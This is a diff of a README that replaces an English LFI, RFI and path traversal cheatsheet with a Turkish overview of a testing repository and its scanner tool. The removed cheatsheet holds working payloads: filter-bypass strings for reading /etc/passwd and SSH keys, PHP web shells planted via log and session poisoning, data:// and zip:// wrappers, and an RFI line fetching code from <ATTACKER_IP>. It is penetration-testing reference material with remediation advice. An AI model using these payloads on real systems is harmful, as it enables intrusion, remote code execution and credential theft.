@@ -1,117 +1,67 @@
-# LFI & Path Traversal Cheatsheet
+# 🛡️ Web Security LFI & Path Traversal Guide + `LFI-Path-Hunter`
 
-Minimalist reference for discovering, bypassing, exploiting, and mitigating Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal vulnerabilities.
+Local File Inclusion (**LFI**), Remote File Inclusion (**RFI**) ve **Path Traversal** zafiyetlerini **adım adım tespit etmek, filtreleri aşmak, sömürmek (LFI2RCE) ve güvenli kodlama ile kapatmak** için birleştirilmiş teknik saha rehberi ve otomatik denetim aracı.
 
----
-
-## 1. Core Concepts
-
-| Vulnerability | Mechanism | Primary Impact |
-| :--- | :--- | :--- |
-| **Path Traversal** | Reads arbitrary files via `../` without executing them | Information disclosure (`/etc/passwd`, `.env`, keys) |
-| **LFI** | Includes & executes local files via `include()`, `require()` | Information disclosure + **RCE** (via poisoning/wrappers) |
-| **RFI** | Includes & executes remote files (`allow_url_include = On`) | Direct **RCE** |
-
-**Common Vulnerable Functions:**
-* **PHP:** `include()`, `require()`, `include_once()`, `require_once()`, `file_get_contents()`, `readfile()`
-* **Python:** `open()`, `os.path.join()`, `send_file()`
-* **Node.js:** `fs.readFile()`, `res.sendFile()`
-* **Java:** `new File()`, `FileInputStream()`
+> **Yasal Uyarı:** Bu depo yalnızca kendi sahip olduğunuz sistemler, eğitim laboratuvarları (TryHackMe, PortSwigger, HTB) veya yazılı izniniz bulunan yetkili güvenlik testleri için hazırlanmıştır.
 
 ---
 
-## 2. Discovery & Fingerprinting
+## 🗺️ Adım Adım Nasıl Aranır? (Görsel Akış Şeması)
 
-1. **Entry Points:** Check `GET`/`POST` params (`?page=`, `?file=`, `?lang=`, `?view=`, `?template=`, `?doc=`, `?path=`, `?filename=`), Cookies (`language=`, `theme=`), and HTTP headers.
-2. **Error Fingerprinting:** Send a non-existent value (`?page=nonexistent_123`). A PHP warning reveals:
-   * **Prefix:** e.g., `languages/`
-   * **Suffix:** e.g., `.php`
-   * **Webroot depth:** e.g., `/var/www/html/app/` (use 8–10 `../` levels; traversal stops at `/`)
-   * **OS:** `/` (Linux) vs `\` (Windows)
-3. **Automated Fuzzing:**
-   ```bash
-   ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://<TARGET>/?page=FUZZ" -fs <ERROR_SIZE>
-   ```
+![LFI ve Path Traversal Adım Adım Arama Akış Şeması](assets/lfi_hunting_workflow.png)
+
+```mermaid
+flowchart TD
+    subgraph G1["1. Keşif & Parmak İzi"]
+        A1["Giriş Noktası Yakala<br/>(?page=, ?file=, ?path=, Cookie, Header)"] -->|"Bozuk Değer (?page=test_123)"| A2["Hata Analizi<br/>Prefix? Suffix? Webroot? OS?"]
+        A1 -->|".git Açık mı?"| A3["curl /.git/HEAD -> git-dumper"]
+    end
+
+    subgraph G2["2. Raw Path & Filtre Bypass"]
+        A2 -->|"curl --path-as-is"| B1["Klasik Traversal<br/>(../../../../etc/passwd)"]
+        B1 -->|"../ Siliniyorsa"| B2["Strip & Encode Bypass<br/>(....//, %252f, ..%c0%af, %00)"]
+        B2 -->|"Dil Tuzakları"| B3["Go path.Clean / Python os.path.join<br/>Nginx static.. / Tomcat ..;/"]
+    end
+
+    subgraph G3["3. Okuma, LFI2RCE & Savunma"]
+        B3 -->|"Kaynak Kod Okuma"| C1["php://filter base64<br/>(.env, config.php, id_rsa)"]
+        C1 -->|"Zehirleme & Wrapper"| C2["Log / Session / /proc/self/environ<br/>zip://, phar://, pearcmd.php, CVE-2024-2961"]
+        C2 -->|"Rapor & Kapatma"| C3["realpath() + Allowlist<br/>Sayısal ID + allow_url_include=Off"]
+    end
+
+    G1 --> G2 --> G3
+```
 
 ---
 
-## 3. Filter Bypass Matrix
+## 📂 Depo Yapısı (Hepsi Tek Çatı Altında)
 
-| Defense / Filter | Bypass Payload |
+| Klasör / Dosya | İçerik |
 | :--- | :--- |
-| **Unrestricted** | `../../../../../../../../etc/passwd` |
-| **`../` blocked (absolute path allowed)** | `/etc/passwd` |
-| **Single-pass `../` strip (`str_replace`)** | `....//....//....//etc/passwd` or `..././..././` |
-| **WAF / character filter** | `%2e%2e%2f` (URL encode) or `%252e%252e%252f` (Double URL encode) |
-| **Legacy Unicode / Overlong UTF-8** | `..%c0%af` or `..%ef%bc%8f` |
-| **Forced directory prefix** | `languages/../../../../../etc/passwd` |
-| **Forced extension (`.php`, `.png`)** | `../../../../etc/passwd%00` *(PHP < 5.3.4)* or `php://filter` |
-| **Exact keyword blacklist** | `/etc/passwd/.` or `/etc/passwd/..` |
+| [`docs/LFI_Adim_Adim_Teknik_Rehber.md`](docs/LFI_Adim_Adim_Teknik_Rehber.md) | **Ana Türkçe Teknik Rehber + Cheatsheet:** Adım adım arama metodolojisi, bypass matrisi, dil tuzakları (Go/Python/Java/TCPDF), PHP wrapper'lar, LFI2RCE teknikleri ve savunma. |
+| [`docs/HackTricks_LFI_RFI_Path_Traversal_Derin_Teknik_Rehber.pdf`](docs/HackTricks_LFI_RFI_Path_Traversal_Derin_Teknik_Rehber.pdf) | **Derin Teknik PDF Rehberi:** Kapsamlı LFI/RFI/Path Traversal başvuru kitabı. |
+| [`docs/EN_Cheatsheet.md`](docs/EN_Cheatsheet.md) | **English Reference:** Kısa İngilizce hızlı başvuru özeti. |
+| [`assets/lfi_hunting_workflow.png`](assets/lfi_hunting_workflow.png) | **Adım Adım Arama Akış Şeması:** 6 adımlı görsel av metodolojisi. |
+| [`tool/lfi_hunter.py`](tool/lfi_hunter.py) | **Otomatik Denetim Aracı:** `--path-as-is` davranışlı, sıfır harici bağımlılıklı Python 3 CLI denetçisi. |
+| [`tool/demo_server.py`](tool/demo_server.py) & [`tool/test_lfi_hunter.py`](tool/test_lfi_hunter.py) | **Yerel Lab & Doğrulama Testi:** Zafiyetli vs yamalı sunucu üzerinde otomatik regresyon testi. |
+| [`tool/sample_audit_report.md`](tool/sample_audit_report.md) | Örnek denetim çıktısı. |
 
 ---
 
-## 4. High-Value Target Files
+## ⚡ Hızlı Başlangıç: Ararken Adım Adım Ne Yapacaksın?
 
-* **Linux:** `/etc/passwd`, `/etc/shadow`, `/home/<user>/.ssh/id_rsa`, `/root/.bash_history`, `/var/www/html/.env`, `config.php`, `/proc/self/environ`, `/proc/self/fd/<N>`, `/proc/version`
-* **Windows:** `C:\Windows\win.ini`, `C:\boot.ini`, `C:\inetpub\wwwroot\web.config`, `C:\xampp\apache\logs\access.log`
+1. **Adım 1 — Giriş Noktası & `.git` Kontrolü:** URL'deki `?page=`, `?file=`, `?path=`, `?doc=`, `?lang=` parametrelerini, gizli form alanlarını ve çerezleri yakala. Önce `/.git/HEAD` açık mı bak.
+2. **Adım 2 — Hata Parmak İzi (`?page=test_123`):** Var olmayan bir dosya gönderip `Warning` mesajından **Prefix** (`languages/`), **Suffix** (`.php`), **Webroot derinliği** (`/var/www/html/`) ve **OS** (`/` vs `\`) bilgisini çıkar.
+3. **Adım 3 — `curl --path-as-is` & Bypass:** Tarayıcı ve normal `curl` `../` dizilerini siler; mutlaka `--path-as-is` kullan. Filtre varsa `....//....//`, `%252f` veya prefix ekli (`languages/../../../../../etc/passwd`) dene.
+4. **Adım 4 — Otomatik Tarama (`lfi_hunter.py` / `ffuf`):**
+   ```bash
+   # Otomatik LFI & Path Traversal denetimi (Top-25 parametre + çoklu bypass)
+   python3 tool/lfi_hunter.py --url "http://127.0.0.1:8080/view?page=home" --report audit_report.md
 
----
+   # Yerel zafiyetli vs yamalı doğrulama testini çalıştır
+   python3 tool/test_lfi_hunter.py
+   ```
+5. **Adım 5 — Kaynak Kod & LFI2RCE:** Sadece `/etc/passwd` okuyup durma; `php://filter/convert.base64-encode/resource=config.php` ile şifreleri çek, gerekiyorsa Log Poisoning (`curl -A`), Session Poisoning, `zip://`, `phar://` veya PHP Filter Chain ile RCE dene.
+6. **Adım 6 — Güvenli Kodlama (Remediation):** Kullanıcıdan dosya adı yerine sayısal ID (`?id=1`) al; zorunluysa `realpath()` / `filepath.Rel()` ile kanonikleştirme + strict allowlist uygula.
 
-## 5. Exploitation & LFI2RCE
-
-### PHP Source Code Disclosure (`php://filter`)
-```bash
-curl -s "http://<TARGET>/?page=php://filter/read=convert.base64-encode/resource=config.php" | base64 -d
-```
-*(Omit `.php` if the backend appends it automatically.)*
-
-### Log Poisoning -> RCE
-Inject raw PHP via `curl -A` or `nc` (avoid browser address bar URL-encoding):
-```bash
-curl -s -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>/
-curl -s "http://<TARGET>/?page=../../../../var/log/apache2/access.log&cmd=id"
-```
-*(Alternative targets: `/var/log/nginx/access.log`, `/var/log/auth.log` via SSH username, `/var/mail/<user>`)*
-
-### PHP Session Poisoning -> RCE
-If user input is stored in `$_SESSION`:
-```bash
-curl -s -b "PHPSESSID=<ID>" "http://<TARGET>/?page=/var/lib/php/sessions/sess_<ID>&cmd=id"
-```
-*(Alternative paths: `/tmp/sess_<ID>`, `C:\Windows\Temp\sess_<ID>`)*
-
-### Wrappers (`data://`, `zip://`, `phar://`, Filter Chains)
-```bash
-# data:// (requires allow_url_include = On)
-curl -s "http://<TARGET>/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id"
-
-# zip:// (Upload + LFI)
-zip shell.jpg shell.php
-curl -s "http://<TARGET>/?page=zip://uploads/shell.jpg%23shell&cmd=id"
-```
-* **PHP Filter Chains:** Chain `convert.iconv.*` filters (`synacktiv/php_filter_chain_generator`) to generate and execute PHP code in memory when `allow_url_include = Off` and no log/session files are writable.
-
-### RFI -> RCE (`allow_url_include = On`)
-```bash
-echo '<?php system($_GET["cmd"]); ?>' > rce.txt
-python3 -m http.server 8000
-curl -s "http://<TARGET>/?page=http://<ATTACKER_IP>:8000/rce.txt&cmd=id"
-```
-
----
-
-## 6. Non-PHP Vectors
-
-| Stack | Vector | Example |
-| :--- | :--- | :--- |
-| **Nginx** | Off-by-slash (`location /static` missing trailing `/`) | `http://<TARGET>/static../etc/passwd` |
-| **Tomcat / Spring** | Path parameter normalization bypass | `..;/..;/..;/etc/passwd` |
-| **Python** | `os.path.join(base, user_input)` resets `base` if input starts with `/` | `?file=/etc/passwd` |
-
----
-
-## 7. Remediation
-
-1. **Avoid Direct Paths:** Map numeric IDs (`?id=1`) to server-side file paths.
-2. **Strict Allowlist:** Validate input against a fixed set of permitted filenames.
-3. **Canonicalization:** Resolve `../` and symlinks (`realpath()`, `getCanonicalPath()`) before checking `startsWith(BASE_DIR + "/")`. Never rely on `getAbsolutePath()` or `str_replace("../", "")`.
+👉 Tüm teknik detaylar, kopyala-yapıştır komutlar ve dil bazlı kod inceleme tuzakları için **[Ana Teknik Rehber'e (`docs/LFI_Adim_Adim_Teknik_Rehber.md`)](docs/LFI_Adim_Adim_Teknik_Rehber.md)** geçebilirsin.
